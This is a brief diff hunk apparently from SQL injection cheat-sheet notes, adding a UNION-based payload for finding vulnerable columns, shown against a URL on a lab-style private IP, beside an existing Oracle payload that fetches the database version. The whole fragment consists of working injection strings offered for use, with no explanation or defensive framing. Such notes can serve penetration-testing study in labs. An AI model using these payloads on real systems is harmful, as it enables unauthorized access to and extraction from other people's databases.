@@ -22,6 +22,12 @@
 
 
 
+#To identify vulnerable columns
+
+1 and 1=2 union select 1,2,3,4 >> http://10.10.73.120/post?id=1 and 1=2 union select 1,2,3,4
+
+
+
 #To fetch database version
 
 ' union select banner, null from v$version-- - >> Oracle
